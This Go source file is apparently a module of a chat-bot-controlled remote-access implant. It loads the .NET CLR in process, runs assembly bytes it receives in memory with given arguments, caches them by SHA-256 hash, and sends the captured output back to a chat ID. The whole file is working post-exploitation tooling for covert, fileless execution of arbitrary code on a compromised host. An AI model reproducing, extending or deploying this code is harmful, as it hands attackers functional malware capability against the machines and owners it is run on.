package main

import (
	"sync"
	"crypto/sha256"
	clr "github.com/Ne0nd0g/go-clr"
)

var (
	clrInstance *CLRInstance
	assemblies  []*assembly
)

type assembly struct {
	methodInfo *clr.MethodInfo
	hash       [32]byte
}

type CLRInstance struct {
	runtimeHost *clr.ICORRuntimeHost
	sync.Mutex
}

func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost {
	c.Lock()
	defer c.Unlock()
	if c.runtimeHost == nil {
		c.runtimeHost, _ = clr.LoadCLR(runtime)
		_ = clr.RedirectStdoutStderr()
	}
	return c.runtimeHost
}

func executeAssembly(chatID int64, data []byte, assemblyArgs []string, runtime string) {
	var (
		methodInfo *clr.MethodInfo
		err        error
	)

	rtHost := clrInstance.GetRuntimeHost(runtime)
	if rtHost == nil {
		SendMessage(chatID, "Could not load CLR runtime host")
		return
	}

	if asm := getAssembly(data); asm != nil {
		methodInfo = asm.methodInfo
	} else {
		methodInfo, err = clr.LoadAssembly(rtHost, data)
		if err != nil {
			SendMessage(chatID, "Could not load assembly")
			return
		}
		addAssembly(methodInfo, data)
	}
	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
		// for methods like Main(String[] args), if we pass an empty string slice
		// the clr loader will not pass the argument and look for a method with
		// no arguments, which won't work
		assemblyArgs = []string{" "}
	}

	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
	responseStr := ""
	if len(stdout) > 0 {
		responseStr += "Stdout:\n" + stdout
	}
	if len(stderr) > 0 {
		responseStr += "Stderr:\n" + stderr
	}
	if len(responseStr) == 0 {
		responseStr = "Assembly executed successfully with no output"
	}
	SendMessage(chatID, responseStr)
}

func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
	asmHash := sha256.Sum256(data)
	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
	assemblies = append(assemblies, asm)
}

func getAssembly(data []byte) *assembly {
	asmHash := sha256.Sum256(data)
	for _, asm := range assemblies {
		if asm.hash == asmHash {
			return asm
		}
	}
	return nil
}

func init() {
	clrInstance = &CLRInstance{}
	assemblies = make([]*assembly, 0)
}